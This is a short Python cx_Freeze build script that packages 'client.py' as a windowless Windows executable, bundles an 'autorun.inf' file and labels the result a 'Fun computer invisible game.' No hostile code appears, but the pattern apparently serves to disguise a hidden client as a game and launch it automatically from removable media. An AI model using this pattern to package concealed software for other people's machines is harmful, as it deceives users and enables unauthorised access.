import sys
from cx_Freeze import setup, Executable

include_files = ['autorun.inf']
base = None

if sys.platform =='win32':
    base = 'win32GUI'

setup(name='setup', 
      version='1.2', 
      description='Fun computer invisible game.', 
      options={'build_exe': {'include_files': include_files}}, 
      executables=[Executable("client.py", base=base)])